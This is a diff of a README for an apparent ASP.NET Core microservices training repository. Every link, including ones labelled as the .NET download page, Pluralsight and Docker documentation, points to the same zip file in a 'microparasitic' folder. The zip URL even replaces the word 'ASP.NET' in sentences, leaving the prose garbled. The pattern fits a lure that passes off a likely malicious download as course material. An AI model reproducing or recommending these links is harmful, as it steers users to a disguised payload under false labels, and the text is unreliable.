@@ -1,16 +1,16 @@
 # 🚀 aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12 - Complete Microservices Training
 
 ## 📝 Introduction
-Welcome to your guide for the aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12. This software provides a comprehensive training on microservices using https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip Core. You will learn about key concepts like CQRS, Clean Architecture, and Docker, while setting up a project with MongoDB and RabbitMQ.
+Welcome to your guide for the aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12. This software provides a comprehensive training on microservices using https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip Core. You will learn about key concepts like CQRS, Clean Architecture, and Docker, while setting up a project with MongoDB and RabbitMQ.
 
 ## 🔗 Download Now!
-[![Download the latest release](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip)
+[![Download the latest release](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip)
 
 ## 🚀 Getting Started
 This section will help you to easily download and run the software. Follow these steps to set everything up.
 
 ## 📥 Download & Install
-1. Click the download button above or visit [this page to download](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip).
+1. Click the download button above or visit [this page to download](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip).
    
 2. On the Releases page, you will see multiple files. Choose the latest version.
 
@@ -32,7 +32,7 @@ To run this application smoothly, ensure your system meets the following require
 ## 💻 Installing .NET 8 SDK
 If you do not have the .NET 8 SDK installed, follow these steps:
 
-1. Visit the [.NET Download page](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip) to get the latest version.
+1. Visit the [.NET Download page](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip) to get the latest version.
 
 2. Select your operating system.
 
@@ -69,9 +69,9 @@ By using this software, you will gain the following skills:
 ## 📒 Additional Resources
 To enhance your learning experience, consider the following resources:
 
-- [https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip): A comprehensive guide on microservices architecture.
-- [Pluralsight Courses](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip): Look for courses on https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip Core and microservices.
-- [Docker Documentation](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip): Familiarize yourself with Docker and its various commands.
+- [https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip): A comprehensive guide on microservices architecture.
+- [Pluralsight Courses](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip): Look for courses on https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip Core and microservices.
+- [Docker Documentation](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip): Familiarize yourself with Docker and its various commands.
 
 ## 🛠️ Contributing
 If you wish to contribute to this project, you are welcome. You can fork the repository or submit issues if you find bugs. Make sure to follow the contribution guidelines included in the repository.
@@ -80,6 +80,6 @@ If you wish to contribute to this project, you are welcome. You can fork the rep
 If you have any questions or need support, feel free to reach out by opening an issue on GitHub. A community of developers is here to help you!
 
 ## 🔗 Download Now Again
-Don't forget to visit [this page to download](https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip) the latest version of the software!
+Don't forget to visit [this page to download](https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip) the latest version of the software!
 
-Enjoy your journey in learning microservices with https://raw.githubusercontent.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/main/microparasitic/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12-v2.5.zip Core!
+Enjoy your journey in learning microservices with https://github.com/ArulAnand14/aspnetcore-microservices_formation-course-luisdev-part-3_dotnet-8_csharp-12/raw/refs/heads/main/microparasitic/formation-luisdev-microservices-part-csharp-course-dotnet-aspnetcore-v2.0.zip Core!
